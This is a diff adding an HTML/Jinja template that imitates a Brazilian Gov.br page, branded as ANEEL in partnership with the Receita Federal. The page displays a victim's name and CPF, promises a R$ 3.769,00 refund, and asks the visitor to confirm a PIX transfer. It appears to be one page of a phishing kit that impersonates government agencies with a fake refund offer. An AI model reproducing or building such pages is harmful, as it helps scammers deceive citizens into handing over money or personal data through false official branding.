@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gov.br - Retirada de Restituição</title>
+
+    <!-- Preload fonts -->
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>
+
+    <!-- Styles -->
+    <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'rawline', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'gov-blue': '#003399',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    <!-- Header -->
+    <div class="bg-white py-4">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center text-center">
+                <img src="https://www.gov.br/++theme++padrao_govbr/img/govbr-logo-large.png" alt="Logo do Gov.br" class="h-12 mb-2" />
+                <div>
+                    <p class="text-gov-blue text-[16px] leading-tight font-bold tracking-wide">
+                        ANEEL - Agência Nacional de Energia Elétrica
+                    </p>
+                    <p class="text-gov-blue text-[12px] leading-tight tracking-wide">
+                        Em parceria com a Receita Federal do Brasil
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Barra Azul -->
+    <div class="bg-gov-blue py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center">
+            <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+            </div>
+            <span class="text-white text-xl tracking-wide drop-shadow-sm">RETIRADA DE RESTITUIÇÃO</span>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container mx-auto px-4 py-8 flex-grow">
+        <div class="max-w-2xl mx-auto">
+            <div class="bg-white rounded-lg shadow-md p-6">
+                <div class="mb-6">
+                    <h2 class="text-lg font-bold text-gov-blue mb-2">Confirme os Dados para Retirada</h2>
+                    <p class="text-gray-600">Por favor, verifique se os dados abaixo estão corretos para prosseguir com a retirada da sua restituição:</p>
+                </div>
+
+                <!-- Dados do Beneficiário -->
+                <div class="space-y-4 mb-6">
+                    <div class="border rounded-lg p-4">
+                        <h3 class="font-bold text-gray-700 mb-3">Dados do Beneficiário</h3>
+                        <div class="space-y-2">
+                            <p class="text-sm"><span class="font-medium">Nome:</span> {{ user_data.nome_real }}</p>
+                            <p class="text-sm"><span class="font-medium">CPF:</span> {{ '{}.{}.{}-{}'.format(user_data.cpf[:3], user_data.cpf[3:6], user_data.cpf[6:9], user_data.cpf[9:]) }}</p>
+                            <p class="text-sm"><span class="font-medium">Valor da Restituição:</span> R$ 3.769,00</p>
+                        </div>
+                    </div>
+
+                    <!-- Informações da Chave PIX -->
+                    <div class="border rounded-lg p-4">
+                        <h3 class="font-bold text-gray-700 mb-3">Chave PIX para Recebimento</h3>
+                        <p class="text-sm text-gray-600 mb-2">A chave PIX utilizada será o CPF do beneficiário, conforme regulamentação do Banco Central.</p>
+                        <p class="text-sm"><span class="font-medium">Chave PIX (CPF):</span> {{ '{}.{}.{}-{}'.format(user_data.cpf[:3], user_data.cpf[3:6], user_data.cpf[6:9], user_data.cpf[9:]) }}</p>
+                    </div>
+                </div>
+
+                <!-- Aviso Legal -->
+                <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
+                    <div class="flex">
+                        <div class="flex-shrink-0">
+                            <i class="fas fa-info-circle text-yellow-400"></i>
+                        </div>
+                        <div class="ml-3">
+                            <p class="text-sm text-yellow-700">
+                                Ao prosseguir, você confirma que é o titular dos dados informados e que está de acordo com o recebimento da restituição via PIX.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <form action="{{ url_for('processar_retirada') }}" method="POST" class="space-y-4">
+                    <div class="flex items-center mb-4">
+                        <input type="checkbox" required id="confirma_dados" name="confirma_dados" class="h-4 w-4 text-gov-blue focus:ring-gov-blue border-gray-300 rounded">
+                        <label for="confirma_dados" class="ml-2 block text-sm text-gray-700">
+                            Confirmo que os dados acima estão corretos e autorizo a transferência via PIX
+                        </label>
+                    </div>
+
+                    <button type="submit" class="w-full bg-gov-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200">
+                        <span>Confirmar e Prosseguir com a Retirada</span>
+                        <i class="fas fa-arrow-right ml-2"></i>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="bg-gov-blue text-white text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} ANEEL - Agência Nacional de Energia Elétrica. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento: 167</p>
+    </div>
+</body>
+</html>
